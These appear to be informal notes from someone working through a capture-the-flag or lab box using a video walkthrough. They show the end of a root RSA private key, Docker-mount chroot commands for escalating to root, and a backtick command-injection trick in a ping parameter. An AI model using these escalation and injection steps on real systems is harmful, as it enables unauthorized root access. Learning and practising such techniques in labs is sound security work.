	6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
	gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
	MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
	bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
	-----END RSA PRIVATE KEY-----
	bash-5.0# ^C

got rsa private key. for root.

5:40 PM 1/9/2023
still following walkthrough to use the rsa key now.

docker run -v/:/mnt --rm -it alpine chroot /mnt sh # did not work.
	trying this next cmd from video.
docker run -v/:/mnt --rm -it bash chroot /mnt sh


https://www.youtube.com/watch?v=Z4avvN9CKnU
the video walkthrough i went through.

BACK TICKS TAKE PRECEDENCE `, it ping?ip=`ls` = the ls will always be pulled first.
```

```
==ESCALATION VIA DOCKER==